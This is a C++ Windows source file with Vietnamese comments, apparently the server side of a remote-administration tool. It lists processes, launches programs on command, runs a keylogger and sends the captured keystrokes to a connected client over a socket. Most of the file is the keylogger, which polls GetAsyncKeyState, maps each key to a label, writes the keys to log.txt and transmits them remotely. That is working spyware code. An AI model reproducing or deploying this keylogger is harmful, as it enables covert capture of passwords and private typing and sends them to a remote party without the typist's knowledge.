#include "header.h"

void runCommand(SOCKET clientSocket) {
    // Thực thi lệnh tasklist để lấy danh sách tiến trình
    FILE* pipe = _popen("tasklist", "r");
    if (!pipe) {
        cerr << "Lỗi khi chạy lệnh task list." << endl;
        return;
    }
    char buffer[BUFFER_SIZE];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        // Gửi từng dòng kết quả về cho client
        send(clientSocket, buffer, strlen(buffer), 0);
    }
    _pclose(pipe);
}

void startApplication(const std::string& command, SOCKET clientSocket) {
    // Khởi động ứng dụng thông qua ShellExecuteA
    if (ShellExecuteA(NULL, "open", command.c_str(), NULL, NULL, SW_SHOWNORMAL) <= (HINSTANCE)32) {
        std::cerr << "Không thể khởi động ứng dụng." << std::endl;
        std::string errorMsg = "Không thể khởi động ứng dụng.";
        send(clientSocket, errorMsg.c_str(), errorMsg.size(), 0);
    }
    else {
        std::cout << "Ứng dụng '" << command << "' đã được khởi động thành công." << std::endl;
        std::string successMsg = "Ứng dụng đã được khởi động thành công.";
        send(clientSocket, successMsg.c_str(), successMsg.size(), 0);
    }
}


void StartKeylogger(SOCKET clientSocket) {
    std::ofstream logFile("log.txt");
    if (!logFile.is_open()) {
        std::cerr << "Không thể mở file log!" << std::endl;
        return;
    }

    std::string keyBuffer;
    auto lastKeyPressTime = std::chrono::steady_clock::now();

    while (true) {
        for (int key = 8; key <= 255; key++) {
           SHORT keyState = GetAsyncKeyState(key);


            if (keyState & 0b1) {
                std::string keyLog = "";

                switch (key) { 
                case VK_SPACE: keyLog = "[SPACE] "; break;
                case VK_ESCAPE: keyLog = "[ESC] "; break;
                case VK_RETURN: keyLog = "[ENTER] "; break; 
                case VK_TAB: keyLog = "[TAB] "; break;
                case VK_SHIFT: keyLog = "[SHIFT] "; break; 
                case VK_BACK: keyLog = "[BACKSPACE] "; break;
                case VK_RBUTTON: keyLog = "[RIGHT_CLICK] "; break; 
                case VK_LBUTTON: keyLog = "[LEFT_CLICK] "; break; 
                case VK_CONTROL: keyLog = "[CTRL] "; break;
                case VK_MENU: keyLog = "[ALT] "; break;
                case VK_CAPITAL: keyLog = "[CAPS_LOCK] "; break;
                case VK_LEFT: keyLog = "[LEFT] "; break;      // Phím mũi tên trái
                case VK_RIGHT: keyLog = "[RIGHT] "; break;    // Phím mũi tên phải
                case VK_UP: keyLog = "[UP] "; break;          // Phím mũi tên lên
                case VK_DOWN: keyLog = "[DOWN] "; break;      // Phím mũi tên xuống
                case 0x30: keyLog = "[0] "; break;                  // Phím 0
                case 0x31: keyLog = "[1] "; break;                  // Phím 1
                case 0x32: keyLog = "[2] "; break;                  // Phím 2
                case 0x33: keyLog = "[3] "; break;                  // Phím 3
                case 0x34: keyLog = "[4] "; break;                  // Phím 4
                case 0x35: keyLog = "[5] "; break;                  // Phím 5
                case 0x36: keyLog = "[6] "; break;                  // Phím 6
                case 0x37: keyLog = "[7] "; break;                  // Phím 7
                case 0x38: keyLog = "[8] "; break;                  // Phím 8
                case 0x39: keyLog = "[9] "; break;                  // Phím 9
                case VK_OEM_PLUS: keyLog = "[+] "; break;           // Phím +
                case VK_OEM_MINUS: keyLog = "[-] "; break;          // Phím -
                case VK_OEM_5: keyLog = "[|] "; break;              // Phím 
                case VK_OEM_7: keyLog = "['] "; break; 
                case VK_OEM_COMMA: keyLog = "[,] "; break;          // Phím ,
                case VK_OEM_PERIOD: keyLog = "[.] "; break;
                case VK_OEM_1: keyLog = "[;] "; break;          // Phím .
                case VK_OEM_2: keyLog = "[/] "; break;              // Phím /
                case VK_OEM_3: keyLog = "[`] "; break;
                case VK_LWIN: keyLog = "[WINDOWS] "; break;  // Phím Windows trái
                case VK_F1: keyLog = "[F1] "; break;
                case VK_F2: keyLog = "[F2] "; break;
                case VK_F3: keyLog = "[F3] "; break;
                case VK_F4: keyLog = "[F4] "; break;
                case VK_F5: keyLog = "[F5] "; break;
                case VK_F6: keyLog = "[F6] "; break;
                case VK_F7: keyLog = "[F7] "; break;
                case VK_F8: keyLog = "[F8] "; break;
                case VK_F9: keyLog = "[F9] "; break;
                case VK_F10: keyLog = "[F10] "; break;
                case VK_F11: keyLog = "[F11] "; break;
                case VK_F12: keyLog = "[F12] "; break;
                default: 
                    if (isalpha(key)) {
                        
                        keyLog += (char)key; 
                    } 
                    break; 
                }
                if (!keyLog.empty()) {
                    if (logFile.fail()) {
                        std::cerr << "Gặp lỗi khi ghi vào file log." << std::endl;
                    }
                    logFile << keyLog;
                    logFile.flush();
                    keyBuffer += keyLog;
                    lastKeyPressTime = std::chrono::steady_clock::now();  // Cập nhật thời điểm nhấn phím
                }
            }
        }

        auto currentTime = std::chrono::steady_clock::now();
        auto timeSinceLastPress = std::chrono::duration_cast<std::chrono::seconds>(currentTime - lastKeyPressTime);

        if (timeSinceLastPress.count() >= 3 && !keyBuffer.empty()) {
            cout << "Da gui log den client\n";
            int bytesSent = send(clientSocket, keyBuffer.c_str(), keyBuffer.size(), 0);
            if (bytesSent == SOCKET_ERROR) {
                std::cerr << "Loi gui du lieu toi client." << std::endl;
            }
            keyBuffer.clear();  // Xóa bộ đệm sau khi gửi
            break;
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    logFile.close();
}




void SendLogToClient(SOCKET clientSocket) {
    std::ifstream logFile("log.txt");
    std::string line;
    std::string keylogData;
    if (logFile.is_open()) {
        while (std::getline(logFile, line)) {
            keylogData += line + "\n";
        }
        logFile.close();

        // Gửi dữ liệu log đến client
        send(clientSocket, keylogData.c_str(), keylogData.size(), 0);

        // Gửi chuỗi kết thúc log
        send(clientSocket, "END_LOG", 7, 0);  // "END_LOG" báo hiệu kết thúc
        std::cout << "Sent keylog data to client." << std::endl;
    }
    else {
        std::cerr << "Failed to open keylog file." << std::endl;
    }
}



